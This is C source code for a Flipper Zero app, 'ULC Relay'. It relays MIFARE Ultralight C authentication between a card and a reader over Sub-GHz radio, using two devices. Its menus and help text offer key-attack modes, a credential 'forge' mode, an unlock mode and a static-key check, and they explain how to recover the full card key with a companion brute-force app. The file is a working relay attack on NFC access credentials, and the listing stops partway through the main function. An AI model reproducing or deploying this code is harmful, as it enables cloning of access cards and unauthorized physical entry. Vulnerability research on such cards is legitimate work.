#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_cortex.h>
#include <furi_hal_gpio.h>
#include <furi_hal_spi.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <input/input.h>
#include <furi_hal_nfc.h>
#include <lib/drivers/st25r3916.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a.h>
#include <lib/nfc/protocols/iso14443_3a/iso14443_3a_listener.h>
#include <lib/nfc/protocols/mf_ultralight/mf_ultralight.h>
#include <lib/subghz/subghz_tx_rx_worker.h>
#include <nfc/nfc.h>
#include <nfc/nfc_device.h>
#include <nfc/nfc_listener.h>

#define TAG                           "ULCRelay"
#define MESSAGE_MAX_LEN               32
#define DEFAULT_FREQUENCY             433920000
#define SUBGHZ_DEVICE_CC1101_INT_NAME "cc1101_int"
#define CMD_WUPA                      0x52 // 7 bits
#define CMD_ANTICOLL                  0x93
#define CMD_ANTICOLL_2                0x95
#define CMD_SELECT                    0x93
#define CMD_SELECT_2                  0x95
#define NFC_APP_FOLDER                EXT_PATH("nfc")
#define NFC_APP_EXTENSION             ".nfc"

typedef enum {
    AppStateMain,
    AppStateHelp,
    AppStateEmulateOrRead,
    AppStateChooseCardMode,
    AppStateReaderSideInit,
    AppStateCardSideInit,
    AppStateNfcActive,
    AppStateWaitingForAuth1,
    AppStateWaitingForAuth2,
    AppStateEmulatingCardInit,
    AppStateEmulatingCard,
    AppStateEmulatingCardDone,
    AppStateKDFCheckResult,
    AppStateRelayComplete,
    AppStateError,
} AppState;

typedef struct {
    uint8_t scroll_pos;
    uint8_t scroll_num;
    FuriString* text;
} HelpState;

typedef enum {
    AppModeStandard,
    AppModeCardSide,
    AppModeReaderSide
} AppMode;

typedef enum {
    AppPostauthModeRead,
    AppPostauthModeUnlock,
    AppPostauthModeKDFCheck,
    AppPostauthModeCredForge1,
    AppPostauthModeKey1,
    AppPostauthModeKey2,
    AppPostauthModeKey3,
    AppPostauthModeKey4
} AppPostauthMode;

typedef struct {
    FuriString* message;
    bool message_received;
} AppData;

typedef struct {
    AppState state;
    AppMode mode;
    AppPostauthMode postauth_mode;
    const char* error;
    uint8_t auth1_response[8];
    uint8_t auth2_response[16];
    bool auth2_received;
    uint8_t uid[10];
    uint8_t uid_len;
    bool is_vulnerable;
    bool is_static_key;
    bool field_active;
    ViewPort* view_port;
    Gui* gui;
    FuriMutex* nfc_mutex;
    FuriMutex* subghz_mutex;
    SubGhzTxRxWorker* subghz_txrx;
    AppData* data;
    NotificationApp* notifications;
    FuriMessageQueue* event_queue;
    Nfc* nfc;
    NfcListener* listener;
    NfcDevice* device;
    HelpState* help_state;
} AppContext;

typedef enum {
    EventTypeTick,
    EventTypeKey,
    EventTypeRx,
} EventType;

typedef struct {
    EventType type;
    InputEvent input;
} AppEvent;

static void setup_nfc_field(FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "setup_nfc_field");
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    furi_delay_ms(1);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_write_reg(handle, ST25R3916_REG_MODE, ST25R3916_REG_MODE_om_iso14443a);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_BIT_RATE,
        ST25R3916_REG_BIT_RATE_rxrate_106 | ST25R3916_REG_BIT_RATE_txrate_106);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF1, ST25R3916_REG_RX_CONF1_z600k);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_RX_CONF2,
        ST25R3916_REG_RX_CONF2_sqm_dyn | ST25R3916_REG_RX_CONF2_agc_en |
            ST25R3916_REG_RX_CONF2_agc_m);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF3, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_RX_CONF4, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_ISO14443A_NFC, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_EMD_SUP_CONF, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_CORR_CONF1,
        ST25R3916_REG_CORR_CONF1_corr_s7 | ST25R3916_REG_CORR_CONF1_corr_s6 |
            ST25R3916_REG_CORR_CONF1_corr_s5 | ST25R3916_REG_CORR_CONF1_corr_s4);
    st25r3916_write_reg(handle, ST25R3916_REG_CORR_CONF2, 0x00);
    st25r3916_write_reg(handle, ST25R3916_REG_MASK_RX_TIMER, 0x00);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_TIMER_EMV_CONTROL,
        ST25R3916_REG_TIMER_EMV_CONTROL_nrt_emv_off |
            ST25R3916_REG_TIMER_EMV_CONTROL_nrt_step_64fc);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV,
        ST25R3916_REG_FIELD_THRESHOLD_ACTV_trg_105mV |
            ST25R3916_REG_FIELD_THRESHOLD_ACTV_rfe_105mV);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV,
        ST25R3916_REG_FIELD_THRESHOLD_DEACTV_trg_75mV |
            ST25R3916_REG_FIELD_THRESHOLD_DEACTV_rfe_75mV);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_A, 0x82);
    st25r3916_write_reg(handle, ST25R3916_REG_ANT_TUNE_B, 0x82);
    st25r3916_get_irq(handle);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_UNMASK_RECEIVE_DATA);
    furi_delay_ms(1);
    st25r3916_write_reg(
        handle,
        ST25R3916_REG_OP_CONTROL,
        ST25R3916_REG_OP_CONTROL_tx_en | ST25R3916_REG_OP_CONTROL_rx_en |
            ST25R3916_REG_OP_CONTROL_en);
    furi_delay_ms(10);
    FURI_LOG_I(TAG, "RF field enabled");
}

static void disable_nfc_field(FuriHalSpiBusHandle* handle) {
    FURI_LOG_I(TAG, "Disabling NFC field");
    st25r3916_write_reg(handle, ST25R3916_REG_OP_CONTROL, 0x00);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_SET_DEFAULT);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    furi_delay_ms(1);
    FURI_LOG_I(TAG, "NFC field disabled");
}

static uint16_t calculate_crc16(uint8_t* data, size_t length) {
    uint16_t crc = 0x6363;
    for(size_t i = 0; i < length; i++) {
        uint8_t byte = data[i];
        byte = byte ^ (uint8_t)(crc & 0x00FF);
        byte = byte ^ (byte << 4);
        crc = (crc >> 8) ^ ((uint16_t)byte << 8) ^ ((uint16_t)byte << 3) ^ ((uint16_t)byte >> 4);
    }
    return crc;
}

static void log_rx_data(uint8_t* rx_buffer, size_t rx_bits) {
    if(rx_bits > 0) {
        size_t bytes = (rx_bits + 7) / 8;
        char hex_str[128] = {0};
        char* p = hex_str;
        for(size_t i = 0; i < bytes; i++) {
            p += snprintf(p, sizeof(hex_str) - (p - hex_str), "%02X ", rx_buffer[i]);
        }
        FURI_LOG_D(TAG, "RX(%d bits): %s", (int)rx_bits, hex_str);
    }
}

static bool send_receive_command(
    FuriHalSpiBusHandle* handle,
    const uint8_t* tx_data,
    size_t tx_bits,
    uint8_t* rx_buffer,
    size_t rx_buffer_size,
    size_t* rx_bits,
    bool send_seven_bits,
    bool send_with_crc) {
    UNUSED(rx_buffer_size);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_CLEAR_FIFO);
    st25r3916_get_irq(handle);
    if(send_seven_bits) {
        st25r3916_write_reg(
            handle,
            ST25R3916_REG_ISO14443A_NFC,
            ST25R3916_REG_ISO14443A_NFC_no_tx_par | ST25R3916_REG_ISO14443A_NFC_no_rx_par);
    } else {
        st25r3916_write_reg(handle, ST25R3916_REG_ISO14443A_NFC, 0x00);
        st25r3916_write_reg(handle, ST25R3916_REG_EMD_SUP_CONF, 0x00);
    }
    st25r3916_write_fifo(handle, tx_data, tx_bits);
    st25r3916_direct_cmd(
        handle,
        send_with_crc ? ST25R3916_CMD_TRANSMIT_WITH_CRC : ST25R3916_CMD_TRANSMIT_WITHOUT_CRC);
    furi_delay_ms(5);
    st25r3916_direct_cmd(handle, ST25R3916_CMD_UNMASK_RECEIVE_DATA);
    furi_delay_ms(10);
    uint8_t tmp_buffer[64];
    size_t tmp_bits = 0;
    bool success = st25r3916_read_fifo(handle, tmp_buffer, sizeof(tmp_buffer), &tmp_bits);
    if(success && tmp_bits > 0) {
        *rx_bits = tmp_bits;
        memcpy(rx_buffer, tmp_buffer, (tmp_bits + 7) / 8);
        log_rx_data(rx_buffer, tmp_bits);
        return true;
    }
    return false;
}

static bool initialize_card(FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t rx_buffer[32];
    size_t rx_bits = 0;

    // WUPA (7 bits)
    uint8_t wupa = CMD_WUPA;
    if(!send_receive_command(
           handle, &wupa, 7, rx_buffer, sizeof(rx_buffer), &rx_bits, true, false)) {
        return false;
    }
    if(rx_buffer[0] != 0x44) {
        return false;
    }

    // ANTICOLL => 16 bits
    uint8_t anticoll[] = {CMD_ANTICOLL, 0x20};
    if(!send_receive_command(
           handle, anticoll, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false, false)) {
        return false;
    }
    memcpy(app->uid, rx_buffer, 4);

    // SELECT
    uint8_t select_cmd[7];
    select_cmd[0] = CMD_SELECT;
    select_cmd[1] = 0x70;
    memcpy(&select_cmd[2], app->uid, 4);
    uint8_t bcc = app->uid[0] ^ app->uid[1] ^ app->uid[2] ^ app->uid[3];
    select_cmd[6] = bcc;

    if(!send_receive_command(
           handle, select_cmd, 7 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, false, true)) {
        return false;
    }
    // Cascade check
    if(rx_buffer[0] & 0x04) {
        // Need second level
        uint8_t anticoll2[] = {CMD_ANTICOLL_2, 0x20};
        if(!send_receive_command(
               handle, anticoll2, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false, false)) {
            return false;
        }
        memcpy(&app->uid[4], rx_buffer, 4);
        app->uid_len = 7;

        select_cmd[0] = CMD_SELECT_2;
        memcpy(&select_cmd[2], &app->uid[4], 4);
        bcc = rx_buffer[0] ^ rx_buffer[1] ^ rx_buffer[2] ^ rx_buffer[3];
        select_cmd[6] = bcc;

        if(!send_receive_command(
               handle, select_cmd, 7 * 8, rx_buffer, sizeof(rx_buffer), &rx_bits, false, true)) {
            return false;
        }
    } else {
        app->uid_len = 4;
    }
    return true;
}

static void rx_event_callback(void* context) {
    furi_assert(context);
    AppContext* app = context;
    AppEvent event = {.type = EventTypeRx};
    furi_message_queue_put(app->event_queue, &event, FuriWaitForever);
}

// Handles receiving SubGHz messages
static void handle_rx(AppContext* app) {
    uint8_t message[MESSAGE_MAX_LEN] = {0};
    size_t recv_len = subghz_tx_rx_worker_read(app->subghz_txrx, message, MESSAGE_MAX_LEN);
    if(recv_len > 0) {
        furi_mutex_acquire(app->subghz_mutex, FuriWaitForever);
        furi_string_set(app->data->message, (const char*)message);
        app->data->message_received = true;
        if((app->mode == AppModeReaderSide) && (app->state == AppStateWaitingForAuth1)) {
            if((recv_len == 32) && (message[0] == 0x1A)) { // 7 bytes UID + 8 bytes AUTH1
                FURI_LOG_I(TAG, "Received UID and AUTH1 response");
                app->uid_len = 7;
                memcpy(app->uid, message + 1, app->uid_len);
                memcpy(app->auth1_response, message + 1 + app->uid_len, 8);
                FURI_LOG_I(
                    TAG,
                    "UID: %02X %02X %02X %02X %02X %02X %02X",
                    app->uid[0],
                    app->uid[1],
                    app->uid[2],
                    app->uid[3],
                    app->uid[4],
                    app->uid[5],
                    app->uid[6]);
                FURI_LOG_I(
                    TAG,
                    "AUTH1: %02X %02X %02X %02X %02X %02X %02X %02X",
                    app->auth1_response[0],
                    app->auth1_response[1],
                    app->auth1_response[2],
                    app->auth1_response[3],
                    app->auth1_response[4],
                    app->auth1_response[5],
                    app->auth1_response[6],
                    app->auth1_response[7]);
                app->state = AppStateEmulatingCardInit;
            } else {
                FURI_LOG_E(TAG, "Received wrong data length (%d) or wrong header", recv_len);
            }
        } else if((app->mode == AppModeCardSide) && (app->state == AppStateWaitingForAuth2)) {
            if((recv_len == 32) && (message[0] == 0xAF)) { // 16 bytes AUTH2 response
                FURI_LOG_I(TAG, "Received AUTH2 response");
                memcpy(app->auth2_response, message + 1, 16);
                app->auth2_received = true;
                FURI_LOG_I(
                    TAG,
                    "AUTH2: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
                    app->auth2_response[0],
                    app->auth2_response[1],
                    app->auth2_response[2],
                    app->auth2_response[3],
                    app->auth2_response[4],
                    app->auth2_response[5],
                    app->auth2_response[6],
                    app->auth2_response[7],
                    app->auth2_response[8],
                    app->auth2_response[9],
                    app->auth2_response[10],
                    app->auth2_response[11],
                    app->auth2_response[12],
                    app->auth2_response[13],
                    app->auth2_response[14],
                    app->auth2_response[15]);
            } else {
                FURI_LOG_E(TAG, "Received wrong data length (%d) or wrong header", recv_len);
            }
        }
        furi_mutex_release(app->subghz_mutex);
    }
}

static bool send_auth1_command(FuriHalSpiBusHandle* handle, AppContext* app) {
    uint8_t auth1_cmd[4] = {0x1A, 0x00};
    uint8_t rx_buffer[64];
    size_t rx_bits = 0;

    if(!send_receive_command(
           handle, auth1_cmd, 16, rx_buffer, sizeof(rx_buffer), &rx_bits, false, true)) {
        FURI_LOG_E(TAG, "Failed to send/receive AUTH1 command");
        return false;
    }

    if(rx_bits < 72 || rx_buffer[0] != 0xAF) {
        FURI_LOG_E(TAG, "Invalid AUTH1 response received");
        return false;
    }

    memcpy(app->auth1_response, rx_buffer + 1, 8);

    if(app->postauth_mode == AppPostauthModeKDFCheck) {
        // Overwrite all 7 bytes of UID with random bytes
        uint8_t original_uid[7];
        memcpy(original_uid, app->uid, app->uid_len);
        // Generate a random UID
        furi_hal_random_fill_buf(app->uid, app->uid_len);
        // Ensure the random UID does not match the original UID
        while(memcmp(app->uid, original_uid, app->uid_len) == 0) {
            furi_hal_random_fill_buf(app->uid, app->uid_len);
        }
    }

    // Debug log before sending
    FURI_LOG_D(TAG, "Sending combined data via SubGHz:");
    size_t total_len = (size_t)app->uid_len + 8;
    for(size_t i = 1; i < total_len; i++) {
        FURI_LOG_D(
            TAG,
            "byte[%d]: 0x%02X",
            i,
            i < (size_t)app->uid_len ? app->uid[i] : app->auth1_response[i - app->uid_len]);
    }

    // Switch SPI bus to SubGHz
    furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);

    // Set up SubGHz for transmission
    // Initialize SubGHz
    app->subghz_txrx = subghz_tx_rx_worker_alloc();
    subghz_devices_init();
    const SubGhzDevice* device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
    furi_assert(device);

    // Start SubGHz on default frequency
    if(subghz_tx_rx_worker_start(app->subghz_txrx, device, DEFAULT_FREQUENCY)) {
        subghz_tx_rx_worker_set_callback_have_read(app->subghz_txrx, rx_event_callback, app);
    }

    // Prepare combined data buffer
    uint8_t combined_data[16]; // 1 byte 0x1A + 7 bytes UID + 8 bytes AUTH1
    combined_data[0] =
        0x1A; // Indicates this is the AUTH1 message to the other Flipper, reader sends back 0xAF
    memcpy(combined_data + 1, (app->uid) + 1, app->uid_len);
    memcpy(combined_data + 1 + app->uid_len, app->auth1_response, 8);

    // Enter power suppression mode for transmission
    furi_hal_power_suppress_charge_enter();

    // Send data multiple times for reliability
    int i = 0;
    while(i < 5) {
        subghz_tx_rx_worker_write(app->subghz_txrx, combined_data, total_len + 1);
        i++;
        furi_delay_ms(20);
    }

    if(subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
        subghz_tx_rx_worker_stop(app->subghz_txrx);
    }
    subghz_tx_rx_worker_free(app->subghz_txrx);
    subghz_devices_deinit();
    furi_hal_power_suppress_charge_exit();

    FURI_LOG_D(TAG, "Successfully sent %d bytes via SubGHz", (int)total_len + 1);
    return true;
}

static bool send_auth2_command(AppContext* app) {
    // Debug log before sending
    FURI_LOG_D(TAG, "Sending combined data via SubGHz:");
    size_t total_len = 16;
    for(size_t i = 0; i < total_len; i++) {
        FURI_LOG_D(TAG, "byte[%d]: 0x%02X", i, app->auth2_response[i]);
    }

    // Set up SubGHz for transmission
    // Initialize SubGHz
    app->subghz_txrx = subghz_tx_rx_worker_alloc();
    subghz_devices_init();
    const SubGhzDevice* device = subghz_devices_get_by_name(SUBGHZ_DEVICE_CC1101_INT_NAME);
    furi_assert(device);

    // Start SubGHz on default frequency
    if(subghz_tx_rx_worker_start(app->subghz_txrx, device, DEFAULT_FREQUENCY)) {
        subghz_tx_rx_worker_set_callback_have_read(app->subghz_txrx, rx_event_callback, app);
    }

    // Prepare combined data buffer
    uint8_t combined_data[17]; // 1 byte 0xAF + 16 bytes AUTH2
    combined_data[0] = 0xAF; // Indicates this is the AUTH2 message to the other Flipper
    memcpy(combined_data + 1, app->auth2_response, 16);

    // Enter power suppression mode for transmission
    furi_hal_power_suppress_charge_enter();

    // Debugging: wait for 20 seconds so I can rush the Proxmark under the card and run hf 14a sniff
    //furi_delay_ms(20000);

    // Send data multiple times for reliability
    int i = 0;
    while(i < 5) {
        subghz_tx_rx_worker_write(app->subghz_txrx, combined_data, total_len + 1);
        i++;
        furi_delay_ms(20);
    }

    if(subghz_tx_rx_worker_is_running(app->subghz_txrx)) {
        subghz_tx_rx_worker_stop(app->subghz_txrx);
    }
    subghz_tx_rx_worker_free(app->subghz_txrx);
    subghz_devices_deinit();
    furi_hal_power_suppress_charge_exit();

    FURI_LOG_D(TAG, "Successfully sent %d bytes via SubGHz", (int)total_len + 1);
    return true;
}

static void render_callback(Canvas* canvas, void* ctx) {
    AppContext* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    const char* mode_str = (app->mode == AppModeStandard) ? "ULC Relay" :
                           (app->mode == AppModeCardSide) ? "ULC Relay: Read Card" :
                                                            "ULC Relay: Emulate Card";
    canvas_draw_str(canvas, 2, 12, mode_str);

    canvas_set_font(canvas, FontSecondary);
    switch(app->state) {
    case AppStateMain:
        canvas_draw_str(canvas, 2, 24, "Ready");
        elements_button_center(canvas, "Start");
        elements_button_right(canvas, "Help");
        break;
    case AppStateHelp:
        elements_scrollbar_pos(
            canvas, 128, 12, 48, app->help_state->scroll_pos, app->help_state->scroll_num);

        // Draw text line by line
        canvas_set_font(canvas, FontSecondary);
        const char* text = furi_string_get_cstr(app->help_state->text);
        const char* line_start = text;
        uint8_t y = 24; // Start y position

        // Draw each line with scroll offset
        while(*line_start) {
            const char* line_end = strchr(line_start, '\n');
            if(!line_end) line_end = line_start + strlen(line_start);

            // Only draw lines that are visible (after scroll offset)
            int line_y = y - (app->help_state->scroll_pos * 12);
            if(line_y >= 24 && line_y < 64) {
                char line_buf[128];
                size_t line_len = line_end - line_start;
                strncpy(line_buf, line_start, line_len);
                line_buf[line_len] = '\0';
                canvas_draw_str(canvas, 2, line_y, line_buf);
            }

            y += 12; // Move to next line position
            if(!*line_end) break;
            line_start = line_end + 1; // Skip the newline
        }
        break;
    case AppStateEmulateOrRead:
        canvas_draw_str(canvas, 2, 24, "Emulate or Read");
        elements_button_left(canvas, "Emulate");
        elements_button_right(canvas, "Read");
        break;
    case AppStateChooseCardMode: {
        canvas_draw_str(canvas, 2, 24, "Select Read Mode");
        char postauth_mode_str[32];
        snprintf(
            postauth_mode_str,
            sizeof(postauth_mode_str),
            "Read mode is: %s",
            (app->postauth_mode == AppPostauthModeRead)       ? "READ" :
            (app->postauth_mode == AppPostauthModeUnlock)     ? "UNLOCK" :
            (app->postauth_mode == AppPostauthModeKDFCheck)   ? "KDF CHECK" :
            (app->postauth_mode == AppPostauthModeCredForge1) ? "FORGE 1" :
            (app->postauth_mode == AppPostauthModeKey1)       ? "KEY 1" :
            (app->postauth_mode == AppPostauthModeKey2)       ? "KEY 2" :
            (app->postauth_mode == AppPostauthModeKey3)       ? "KEY 3" :
            (app->postauth_mode == AppPostauthModeKey4)       ? "KEY 4" :
                                                                "UNDEF");
        canvas_draw_str(canvas, 2, 36, postauth_mode_str);
        char postauth_mode_num[4];
        snprintf(postauth_mode_num, sizeof(postauth_mode_num), "%d", app->postauth_mode + 1);
        // Pixel perfect
        canvas_draw_str(canvas, 96, 24, "(");
        if(app->postauth_mode == 0) {
            canvas_draw_str(canvas, 101, 24, postauth_mode_num);
        } else {
            canvas_draw_str(canvas, 100, 24, postauth_mode_num);
        }
        canvas_draw_str(canvas, 102, 24, "  /8");
        canvas_draw_str(canvas, 121, 24, ")");
        char postauth_mode_desc[32];
        snprintf(
            postauth_mode_desc,
            sizeof(postauth_mode_desc),
            "Description: %s",
            (app->postauth_mode == AppPostauthModeRead)       ? "Reads full card" :
            (app->postauth_mode == AppPostauthModeUnlock)     ? "Allow page access" :
            (app->postauth_mode == AppPostauthModeKDFCheck)   ? "Static key check" :
            (app->postauth_mode == AppPostauthModeCredForge1) ? "Forge (system 1)" :
            (app->postauth_mode == AppPostauthModeKey1)       ? "Attack key 1, pt1" :
            (app->postauth_mode == AppPostauthModeKey2)       ? "Attack key 1, pt2" :
            (app->postauth_mode == AppPostauthModeKey3)       ? "Attack key 2, pt1" :
            (app->postauth_mode == AppPostauthModeKey4)       ? "Attack key 2, pt2" :
                                                                "Undefined");
        canvas_draw_str(canvas, 2, 48, postauth_mode_desc);
        elements_button_left(canvas, "Mode");
        elements_button_right(canvas, "Mode");
        elements_button_center(canvas, "Select");
    } break;
    case AppStateReaderSideInit:
        canvas_draw_str(canvas, 2, 24, "Reader side init");
        break;
    case AppStateCardSideInit:
        canvas_draw_str(canvas, 2, 24, "Card side init");
        break;
    case AppStateNfcActive:
        canvas_draw_str(canvas, 2, 24, "NFC Field Active");
        canvas_draw_str(canvas, 2, 36, "Waiting for card...");
        break;
    case AppStateWaitingForAuth1:
        canvas_draw_str(canvas, 2, 24, "Waiting for AUTH1...");
        break;
    case AppStateWaitingForAuth2:
        canvas_draw_str(canvas, 2, 24, "Waiting for AUTH2...");
        break;
    case AppStateEmulatingCardInit:
    case AppStateEmulatingCard:
    case AppStateEmulatingCardDone:
        canvas_draw_str(canvas, 2, 24, "Emulating card");
        // Display the UID and AUTH1 challenge. Must create a str to display
        char uid_str[32];
        char auth1_str[32];
        snprintf(
            uid_str,
            sizeof(uid_str),
            "UID: %02X%02X%02X%02X%02X%02X%02X",
            app->uid[0],
            app->uid[1],
            app->uid[2],
            app->uid[3],
            app->uid[4],
            app->uid[5],
            app->uid[6]);
        snprintf(
            auth1_str,
            sizeof(auth1_str),
            "AUTH1: %02X%02X%02X%02X%02X%02X%02X%02X",
            app->auth1_response[0],
            app->auth1_response[1],
            app->auth1_response[2],
            app->auth1_response[3],
            app->auth1_response[4],
            app->auth1_response[5],
            app->auth1_response[6],
            app->auth1_response[7]);
        canvas_draw_str(canvas, 2, 36, uid_str);
        canvas_draw_str(canvas, 2, 48, auth1_str);
        canvas_draw_str(canvas, 2, 60, "Waiting for AUTH2...");
        break;
    case AppStateKDFCheckResult: {
        char kdf_check_result_str[16];
        snprintf(
            kdf_check_result_str,
            sizeof(kdf_check_result_str),
            "Static key: %s",
            app->is_static_key ? "YES" : "NO");
        canvas_draw_str(canvas, 2, 24, kdf_check_result_str);
    } break;
    case AppStateRelayComplete:
        canvas_draw_str(canvas, 2, 24, "Relay Complete!");
        if(app->mode == AppModeCardSide && app->postauth_mode == AppPostauthModeRead) {
            char is_vulnerable[16];
            snprintf(
                is_vulnerable,
                sizeof(is_vulnerable),
                "Vulnerable: %s",
                app->is_vulnerable ? "YES" : "NO");
            canvas_draw_str(canvas, 2, 36, is_vulnerable);
            canvas_draw_str(canvas, 2, 48, "(does not include tear off)");
        }
        break;
    case AppStateError:
        canvas_draw_str(canvas, 2, 24, "Error!");
        if(app->error) canvas_draw_str(canvas, 2, 36, app->error);
        break;
    }
}

static void input_callback(InputEvent* input_event, void* ctx) {
    furi_assert(ctx);
    AppContext* app = ctx;
    AppEvent event = {.type = EventTypeKey, .input = *input_event};
    furi_message_queue_put(app->event_queue, &event, FuriWaitForever);
}

NfcCommand ulcrelay_listener_callback(NfcGenericEvent event, void* context) {
    AppContext* app = context;
    NfcCommand command = NfcCommandContinue;
    Iso14443_3aListenerEvent* Iso14443_3a_event = event.event_data;
    if(Iso14443_3a_event->type == Iso14443_3aListenerEventTypeReceivedStandardFrame) {
        BitBuffer* buffer = Iso14443_3a_event->data->buffer;
        const uint8_t* data = bit_buffer_get_data(buffer);
        size_t data_len = bit_buffer_get_size_bytes(buffer);
        for(size_t i = 0; i < data_len; i++) {
            FURI_LOG_D(TAG, "Received data: %02X", data[i]);
        }
        if(data_len == 2 && data[0] == 0x1A && data[1] == 0x00) {
            FURI_LOG_I(TAG, "Received AUTH request from reader");
            // Send AUTH-1 reply back to the reader, response must begin with 0xAF
            BitBuffer* auth1_buffer = bit_buffer_alloc(11);
            bit_buffer_append_byte(auth1_buffer, 0xAF);
            bit_buffer_append_bytes(auth1_buffer, app->auth1_response, 8);
            // Append the CRC
            const uint8_t* response_data = bit_buffer_get_data(auth1_buffer);
            uint16_t crc = calculate_crc16((uint8_t*)response_data, 9);
            bit_buffer_append_byte(auth1_buffer, crc & 0xFF);
            bit_buffer_append_byte(auth1_buffer, (crc >> 8) & 0xFF);
            NfcError error = nfc_listener_tx(event.instance, auth1_buffer);
            if(error != NfcErrorNone) {
                FURI_LOG_E(TAG, "Tx error");
            }
        } else if(data_len == 17 && data[0] == 0xAF) {
            FURI_LOG_I(TAG, "Received AUTH2 response from reader");
            app->auth2_received = true;
            memcpy(app->auth2_response, data + 1, 16);
            app->state = AppStateEmulatingCardDone;
        }
    }
    return command;
}

static NfcDevice* ultralight_c_nfc_device_alloc(const uint8_t uid[]) {
    const uint8_t atqa[] = {0x44, 0x00};

    Iso14443_3aData* iso14443_3a_edit_data = iso14443_3a_alloc();
    iso14443_3a_set_uid(iso14443_3a_edit_data, uid, 7);
    iso14443_3a_set_sak(iso14443_3a_edit_data, 0);
    iso14443_3a_set_atqa(iso14443_3a_edit_data, atqa);

    NfcDevice* nfc_device = nfc_device_alloc();
    nfc_device_set_data(nfc_device, NfcProtocolIso14443_3a, iso14443_3a_edit_data);

    iso14443_3a_free(iso14443_3a_edit_data);
    return nfc_device;
}

static NfcDevice* ultralight_c_nfc_device_alloc_full(
    const uint8_t uid[],
    MfUltralightPage* pages,
    bool key_included) {
    const uint8_t atqa[] = {0x44, 0x00};

    Iso14443_3aData* iso14443_3a_edit_data = iso14443_3a_alloc();
    iso14443_3a_set_uid(iso14443_3a_edit_data, uid, 7);
    iso14443_3a_set_sak(iso14443_3a_edit_data, 0);
    iso14443_3a_set_atqa(iso14443_3a_edit_data, atqa);

    MfUltralightData* mf_ultralight_edit_data = mf_ultralight_alloc();
    mf_ultralight_edit_data->iso14443_3a_data = iso14443_3a_edit_data;
    mf_ultralight_edit_data->type = MfUltralightTypeMfulC;

    // Populate pages
    uint8_t page_count = key_included ? 48 : 44;
    for(int i = 0; i < page_count; i++) {
        memcpy(mf_ultralight_edit_data->page[i].data, pages[i].data, MF_ULTRALIGHT_PAGE_SIZE);
    }
    mf_ultralight_edit_data->pages_read = page_count;
    mf_ultralight_edit_data->pages_total = 48;

    NfcDevice* nfc_device = nfc_device_alloc();
    nfc_device_set_data(nfc_device, NfcProtocolMfUltralight, mf_ultralight_edit_data);

    return nfc_device;
}

static void do_shutdown(AppContext* app) {
    if(app->mode == AppModeCardSide && app->field_active) {
        // Turn off NFC field
        furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
        disable_nfc_field(&furi_hal_spi_bus_handle_nfc);
        furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
    }
    notification_message(app->notifications, &sequence_blink_stop);
}

int32_t ulc_relay_app(void* p) {
    // TODO: Resend AUTH1 if AUTH2 is not received within n seconds
    // TODO: Don't crash on exit
    // TODO: Regenerate new auth challenges n times if they fail?
    UNUSED(p);

    // Allocate app context
    AppContext* app = malloc(sizeof(AppContext));
    memset(app, 0, sizeof(AppContext));
    app->state = AppStateMain;
    app->event_queue = furi_message_queue_alloc(8, sizeof(AppEvent));
    app->nfc_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->subghz_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->data = malloc(sizeof(AppData));
    app->data->message = furi_string_alloc();
    app->data->message_received = false;
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->postauth_mode = AppPostauthModeRead;
    app->help_state = malloc(sizeof(HelpState));
    app->help_state->scroll_pos = 0;
    // Calculate number of scroll positions based on total text height
    app->help_state->scroll_num = 17; // Adjust based on number of visible lines needed
    app->help_state->text = furi_string_alloc_set("Two Flippers required.\n"
                                                  "\n"
                                                  "Place first Flipper against\n"
                                                  "reader and select Emulate.\n"
                                                  "\n"
                                                  "Place second Flipper against\n"
                                                  "card and select Read.\n"
                                                  "\n"
                                                  "To verify vulnerability,\n"
                                                  "use READ mode first.\n"
                                                  "Then check if static key\n"
                                                  "is present (KDF CHECK).\n"
                                                  "\n"
                                                  "If vulnerable and static,\n"
                                                  "KEY 1-4 modes can be used\n"
                                                  "with ULC Brute app to\n"
                                                  "recover the full key.\n"
                                                  "\n"
                                                  "Keep devices 2-3 feet apart.\n"
                                                  "Don't cross the streams."); // lol

    // GUI
    app->gui = furi_record_open(RECORD_GUI);
    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, render_callback, app);
    view_port_input_callback_set(app->view_port, input_callback, app);
